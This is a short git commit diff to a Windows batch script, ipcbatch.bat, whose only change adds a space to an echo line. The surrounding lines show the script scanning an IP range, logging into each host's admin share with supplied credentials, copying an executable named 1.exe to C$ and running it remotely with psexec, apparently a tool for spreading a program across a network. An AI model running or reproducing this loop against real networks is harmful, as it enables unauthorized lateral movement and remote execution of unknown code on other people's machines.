613d96e6f60446251499e4004a4a3cfc5885d64c
v1ct0rme <34261184+v1ct0rme@users.noreply.github.com>
2017-12-12 12:45:43 +0800

    Update ipcbatch.bat

--- ipcbatch.bat
+++ ipcbatch.bat
@@ -7,7 +7,7 @@ set /a con=0
 set /a contotal=%ip2%-%ip1%+1
 for /l %%i in (!ip1!,1,!ip2!) do (
 set ip=!ipq!.%%i
-echo sacn!ip!
+echo sacn !ip!
 net use \\!ip! password /user:domain\user
 copy 1.exe \\!ip!\C$\
 psexec \\!ip! c:\1.exe
